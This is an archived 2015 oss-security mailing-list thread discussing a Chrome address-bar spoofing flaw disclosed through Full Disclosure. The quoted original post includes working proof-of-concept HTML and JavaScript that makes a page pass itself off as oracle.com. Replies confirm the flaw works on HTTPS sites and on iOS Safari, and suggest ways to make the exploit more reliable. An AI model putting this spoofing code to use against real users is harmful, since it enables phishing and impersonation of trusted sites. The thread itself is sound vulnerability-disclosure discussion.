X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3052" "Thursday" "2" "July" "2015" "19:17:20" "-0400" "Daniel Wood" "daniel.wood@owasp.org" "<14FBDFC5-67A0-4C57-9DC7-DC71E313A0A0@owasp.org>" "86" "[oss-security] Re: [FD] Google Chrome Address Spoofing (Request For Comment)" nil nil nil "7" "2015070223:17:20" "[oss-security] Re: [FD] Google Chrome Address Spoofing (Request For Comment)" (number mark "        daniel.wood@ Jul  2   86/3052  " thread-indent "\"[oss-security] Re: [FD] Google Chrome Address Spoofing (Request For Comment)\"\n") "<20150702171848.395E573EA@hb.insecure.org>" ("<20150702171848.395E573EA@hb.insecure.org>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 17822 invoked by uid 550); 2 Jul 2015 23:45:17 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 28422 invoked from network); 2 Jul 2015 23:17:29 -0000
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:content-type:mime-version:subject:from
         :in-reply-to:date:cc:content-transfer-encoding:message-id:references
         :to;
        bh=qV+qqskvw5CJqyNEq7moY+FI8xnGe6qx+hfhaUc0ugU=;
        b=beQVInWs5i+vjIkuSDPCJoaDOQL3gLGeNPlfY4toID9fUCern76NsIrr3tTux3XxO6
         lXWGTAxcztWG25QsYtbfwfpzEvSSKcVnw+FEGLLVfT/7Ip/TN9IrTBLvsJMoKSoaMvrU
         hdvTkeLr58AyRjLF1eNUidIHBPzg30ftryiWxD4QehDhKHSM4qBrYf0N4lu8X7RVFTik
         zTz6Bd68y/Bx5VNN1aE9NhEzauNgUxM9GK4bf5pqYIyCT1zpDXrD7NZtx4FuB3yr/wvu
         F0VI2kEsC6hSSzJuQ6IvWO2Lu9lOkkjNILfvdDGMeyo8sl9ZXSkF/g3KChHnY87yF/NX
         B89g==
X-Gm-Message-State: ALoCoQmD+HNpvt4lNlYdRj1pmPdBg5NJc1eLLrHk1s7ue5S7JqloubmfRcEXP7YNnjEN/rza4vx2
X-Received: by 10.55.18.158 with SMTP id 30mr68106216qks.17.1435879038023;
        Thu, 02 Jul 2015 16:17:18 -0700 (PDT)
Content-Type: text/plain;
	charset=us-ascii
Mime-Version: 1.0 (1.0)
X-Mailer: iPad Mail (12F69)
In-Reply-To: <20150702171848.395E573EA@hb.insecure.org>
Content-Transfer-Encoding: quoted-printable
Message-Id: <14FBDFC5-67A0-4C57-9DC7-DC71E313A0A0@owasp.org>
References: <20150702171848.395E573EA@hb.insecure.org>
Cc: David Leo <david.leo@deusen.co.uk>,
 "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>,
 "bugtraq@securityfocus.com" <bugtraq@securityfocus.com>,
 "fulldisclosure@seclists.org" <fulldisclosure@seclists.org>
Date: Thu, 2 Jul 2015 19:17:20 -0400
From: Daniel Wood <daniel.wood@owasp.org>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Re: [FD] Google Chrome Address Spoofing (Request For Comment)
To: Mustafa Al-Bassam <mus@musalbas.com>

Yes this is a pretty good find. I can also confirm it works on iOS 8.3 (12F=
69) with Safari.

DW
Sent from my iPad

> On Jul 2, 2015, at 9:33 AM, Mustafa Al-Bassam <mus@musalbas.com> wrote:
>=20
> That's pretty neat. Played around with this and made a few discoveries.
>=20
> 1. It shows a valid certificate when you spoof HTTPS sites. That's really=
 bad. POC/screenshot: https://github.com/musalbas/address-spoofing-poc
>=20
> 2. The page isn't responsive when using this flaw. That means you can't s=
poof a login box for example. (I tried.)
>=20
> 3. The success of the exploit seems to depend on if the browser can start=
 loading content.html fast enough. I noticed that the exploit works 100% of=
 the time when used locally. Perhaps a better version of the exploit would =
somehow preload content.html - for example by opening a window with an URL =
that starts with javascript: followed by a script to display the content? T=
hat, or perhaps reducing the interval time for trying to run next() after t=
he popup is created.
>=20
> I wonder if this works on any other browsers?
>=20
> MustafaOn 30 Jun 2015 7:08 am, David Leo <david.leo@deusen.co.uk> wrote:
>>=20
>> Impact:=20
>> The "click to verify" thing is completely broken...=20
>> Anyone can be "BBB Accredited Business" etc.=20
>> You can make whitehouse.gov display "We love Islamic State" :-)=20
>>=20
>> Note:=20
>> No user interaction on the fake page.=20
>>=20
>> Code:=20
>> ***** index.html=20
>> <script>=20
>> function next()=20
>> {=20
>> w.location.replace('http://www.oracle.com/index.html?'+n);n++;=20
>> setTimeout("next();",15);=20
>> setTimeout("next();",25);=20
>> }=20
>> function f()=20
>> {=20
>> w=3Dwindow.open("content.html","_blank","width=3D500 height=3D500");=20
>> i=3DsetInterval("try{x=3Dw.location.href;}catch(e){clearInterval(i);n=3D=
0;next();}",5);=20
>> }=20
>> </script>=20
>> <a href=3D"#" onclick=3D"f()">Go</a><br>=20
>> ***** content.html=20
>> <b>This web page is NOT oracle.com</b>=20
>> <script>location=3D"http://www.oracle.com/index.html";</script>=20
>> ***** It's online=20
>> http://www.deusen.co.uk/items/gwhere.6128645971389012/=20
>> (The page says "June/16/2015" - it works as we tested today)=20
>>=20
>> Request For Comment:=20
>> We reported this to Google.=20
>> They reproduced, and say=20
>> It's DoS which doesn't matter.=20
>> We think it's very strange,=20
>> since the browser does not crash(not DoS),=20
>> and the threat is obvious.=20
>> What's your opinion?=20
>>=20
>> Kind Regards,=20
>>=20
>> PS=20
>> We love clever tricks.=20
>> We love this:=20
>> http://dieyu.org/=20
>>=20
>>=20
>> _______________________________________________=20
>> Sent through the Full Disclosure mailing list=20
>> https://nmap.org/mailman/listinfo/fulldisclosure=20
>> Web Archives & RSS: http://seclists.org/fulldisclosure/
>=20
> _______________________________________________
> Sent through the Full Disclosure mailing list
> https://nmap.org/mailman/listinfo/fulldisclosure
> Web Archives & RSS: http://seclists.org/fulldisclosure/
